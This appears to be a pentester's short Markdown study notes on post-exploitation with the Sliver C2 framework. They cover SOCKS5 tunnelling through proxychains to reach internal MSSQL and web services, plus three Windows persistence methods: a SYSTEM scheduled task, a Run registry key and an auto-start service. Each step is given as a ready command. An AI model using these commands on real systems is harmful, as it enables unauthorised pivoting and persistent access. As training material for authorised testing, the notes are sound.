
![](../../attchments/Pasted%20image%2020260719233546.png)

<h3> Exposing Internal Ports</h3>

```
netstat -ano | findstr 127.0.0.1
```

![](../../attchments/Pasted%20image%2020260719234113.png)

```
socks5 start
```
`SLiver Command to start an Tunnel`

**sudo nano /etc/proxychains4.conf**
```
socks5 127.0.0.1 1081
```


```
proxychains -q impacket-mssqlclient domain/user:'Password'@127.0.0.1 -windows-auth
```
`TTHiss helpss to connect to the local port`

<h3>Pivoting Using SLiver</h3>

AN webiste is accesbile foorm an WIndows Server but not from Attcker machine

cretea na Implan and THen get an session on the windows server

```
socks5 start
```

![](../../attchments/Pasted%20image%2020260720001502.png)

Now that Web Server is Accesable

<h3>Persistence Concepts</h3>

#### Methods

- **Schedules tasks**
schtasks Run Binary on startup

```
schtasks /create /tn "Service_name" /tr "C:\Path\to\binary" /sc onstart /ru SYSTEM
```

- **Registry Keys**
Built-in Utilty 
reg query to set that everytime the user loges in an binary gets executed

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Smart" /t REG_SZ /d 'C:\Path\to\Binary' /f
```

- **Service Creation**
High Priv , start on boot 
sc utility

```
sc.exe create "Service_name" binpath= "C:\Path\to\Binary" start= auto
```
